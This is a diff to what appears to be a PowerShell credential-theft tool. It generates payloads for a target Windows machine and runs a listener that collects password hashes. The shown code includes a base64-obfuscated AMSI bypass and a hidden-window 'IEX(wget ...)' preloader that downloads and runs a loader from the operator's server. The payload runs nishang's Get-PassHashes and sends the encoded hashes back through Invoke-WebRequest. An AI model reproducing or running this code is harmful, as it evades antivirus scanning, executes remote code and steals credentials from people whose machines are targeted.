@@ -1,3 +1,7 @@
+function Get-Resources {
+	return (Test-Path ".\B64-Util\B64-Util.ps1" -and (Test-Path ".\nishang\Gather\Get-PassHashes.ps1") -and (Test-Path ".\Easy-UAC\Easy-UAC.ps1"))
+}
+
 function New-Payloads {
 	[CmdletBinding()]
 	Param(
@@ -11,9 +15,16 @@ function New-Payloads {
 		$ServerPort
 	)
     
+	if (!Get-Resources)
+	{
+		Write-Error -Message "One or multiple dependencies are missing. Execute in source directory."
+		return;
+	}
+
 	Import-Module (Resolve-Path ".\B64-Util\B64-Util.ps1")
 
     $AmsiBypass = '[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))).GetField([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),"NonPublic,Static").SetValue($null,$true)'
+	$GetHashes = Get-Content (Resolve-Path ".\nishang\Gather\Get-PassHashes.ps1")
 
 	$Preloader = "powershell -w h -c IEX(wget 'http://$ServerAddress"+":$ServerPort/loader')"
 
@@ -22,10 +33,7 @@ function New-Payloads {
 	$Loader = $Loader | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII
 
 	$Payload = "$AmsiBypass;"
-	$Payload += Get-Content (Resolve-Path ".\nishang\Gather\Get-PassHashes.ps1") |
-	Out-String |
-	Convert-StringToB64 -Compress -Encoding ASCII |
-	Package-CompressedB64 -Encoding ASCII
+	$Payload +=  $GetHashes | Out-String | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII
 	$Payload += ";Invoke-WebRequest ('http://$ServerAddress"+":$ServerPort/data?data='+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((Get-PassHashes | Out-String))));[GC]::Collect()"
 	$Payload = $Payload | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII
 
@@ -71,7 +79,7 @@ function Start-TelemetryServer {
 
 	if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
     {
-        Write-Error -Message "Please start as Administrator" -Exception PermissionError
+        Write-Error -Message "Please start as Administrator." -Exception PermissionError
         return;
     }
 
@@ -82,7 +90,7 @@ function Start-TelemetryServer {
 		$Listener.Start()
 	}
 	catch {
-		Write-Error -Message "The webserver could not be started"
+		Write-Error -Message "The webserver could not be started."
 		return;
 	}
 
@@ -121,17 +129,21 @@ function Start-HashAcquisition {
 		$ServerAddress,
 		[Parameter(Mandatory = $false, Position = 1)]
 		[ValidateNotNullOrEmpty()]
+		[Int]
+		$ServerPort = 9000,
+		[Parameter(Mandatory = $false, Position = 2)]
+		[ValidateNotNullOrEmpty()]
 		[switch]
 		$SaveToFile,
 		[Parameter(Mandatory = $false, Position = 1)]
 		[ValidateNotNullOrEmpty()]
-		[Int]
-		$ServerPort = 9000
+		[switch]
+		$NoBlock
 	)
 
 	if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
     {
-        Write-Error -Message "Please start as Administrator" -Exception PermissionError
+        Write-Error -Message "Please start as Administrator." -Exception PermissionError
         return;
     }
 
@@ -139,15 +151,22 @@ function Start-HashAcquisition {
 
 	if (Test-Port -IP $ServerAddress -Port $ServerPort)
 	{
-		Write-Error -Message "The specified port ($ServerPort) is already in use"
+		Write-Error -Message "The specified port ($ServerPort) is already in use."
 		return;
 	}
 
 	$Payloads = New-Payloads -ServerAddress $ServerAddress -ServerPort $ServerPort
 
+	if (!$Payloads)
+	{
+		Write-Error -Message "Payload creatin failed."
+		return;
+	}
+
 	Clear-Host
 	Write-Host
 	Write-Host "Execute the following on a target machine:"
+	Write-Host
 	Write-Host $Payloads.Preloader
 	Write-Host
 
@@ -160,7 +179,7 @@ function Start-HashAcquisition {
 
 	if (!$Data)
 	{
-		Write-Error -Message "Data reception failed"
+		Write-Error -Message "Data reception failed."
 		return;
 	}
 
@@ -183,7 +202,6 @@ function Start-HashAcquisition {
 		$HashInfo | Out-File -FilePath (Resolve-Path "Hashes.txt") -Append | Out-Null
 	}
 
-
-	$Host.UI.RawUI.ReadKey() | Out-Null
+	if (!$NoBlock) {$Host.UI.RawUI.ReadKey() | Out-Null}
 
 }
